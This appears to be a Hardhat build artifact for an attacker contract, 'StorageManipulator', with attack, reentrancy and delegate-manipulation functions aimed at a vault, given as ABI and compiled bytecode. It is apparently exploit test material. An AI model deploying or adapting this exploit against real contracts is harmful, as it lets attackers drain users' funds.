{
  "_format": "hh-sol-artifact-1",
  "contractName": "StorageManipulator",
  "sourceName": "contracts/StorageManipulator.sol",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_vault",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "crossFunctionReentrancy",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "manipulateAsDelegate",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "owner",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "vault",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "stateMutability": "payable",
      "type": "receive"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b5060405161065338038061065383398101604081905261002f9161005d565b600080546001600160a01b039092166001600160a01b0319928316179055600180549091163317905561008d565b60006020828403121561006f57600080fd5b81516001600160a01b038116811461008657600080fd5b9392505050565b6105b78061009c6000396000f3fe60806040526004361061004e5760003560e01c806317b966e6146100a75780638da5cb5b146100bc5780639e5faafc146100f8578063c79bcd111461010d578063fbfa77cf1461012f57600080fd5b366100a2576000546001600160a01b031633036100a0576001546040516001600160a01b03909116904780156108fc02916000818181858888f1935050505015801561009e573d6000803e3d6000fd5b505b005b600080fd5b3480156100b357600080fd5b506100a061014f565b3480156100c857600080fd5b506001546100dc906001600160a01b031681565b6040516001600160a01b03909116815260200160405180910390f35b34801561010457600080fd5b506100a06101d3565b34801561011957600080fd5b506100a060016010556001601155600019601255565b34801561013b57600080fd5b506000546100dc906001600160a01b031681565b60405130602482015260009060440160408051601f19818403018152918152602080830180516001600160e01b039081166313af403560e01b178252835160048152602481019094529183018051909216633ccfd60b60e01b17909152825160008054949550929383929083905af150600080825160208401600080545af1505050565b6000805460408051600481526024810182526020810180516001600160e01b0316633ccfd60b60e01b17905290516001600160a01b03909216916102179190610552565b6000604051808303816000865af19150503d8060008114610254576040519150601f19603f3d011682016040523d82523d6000602084013e610259565b606091505b50506000805460408051600481526024810182526020810180516001600160e01b0316633821b97b60e21b179052905193945091926001600160a01b03909116916102a391610552565b6000604051808303816000865af19150503d80600081146102e0576040519150601f19603f3d011682016040523d82523d6000602084013e6102e5565b606091505b5050600080546040516001600160a01b039091168031602483015292935090919060440160408051601f198184030181529181526020820180516001600160e01b0316632e1a7d4d60e01b1790525161033e9190610552565b6000604051808303816000865af19150503d806000811461037b576040519150601f19603f3d011682016040523d82523d6000602084013e610380565b606091505b5050600080546040513060248201526001600160a01b0390911680316044830152606060648301526084820183905292935090919060a40160408051601f198184030181529181526020820180516001600160e01b0316635b0e93fb60e11b179052516103ed9190610552565b6000604051808303816000865af19150503d806000811461042a576040519150601f19603f3d011682016040523d82523d6000602084013e61042f565b606091505b50506000805460408051600481526024810182526020810180516001600160e01b03166378c6905f60e11b179052905193945091926001600160a01b039091169161047991610552565b6000604051808303816000865af19150503d80600081146104b6576040519150601f19603f3d011682016040523d82523d6000602084013e6104bb565b606091505b50506000805460408051600481526024810182526020810180516001600160e01b0316635641ec0360e01b179052905193945091926001600160a01b039091169161050591610552565b6000604051808303816000865af19150503d8060008114610542576040519150601f19603f3d011682016040523d82523d6000602084013e610547565b606091505b505050505050505050565b6000825160005b818110156105735760208186018101518583015201610559565b50600092019182525091905056fea26469706673582212204009a48d9dddd603d121231b3953154345c9e0e779e4ce8b3b08843546070a3b64736f6c63430008120033",
  "linkReferences": {},
  "deployedLinkReferences": {}
}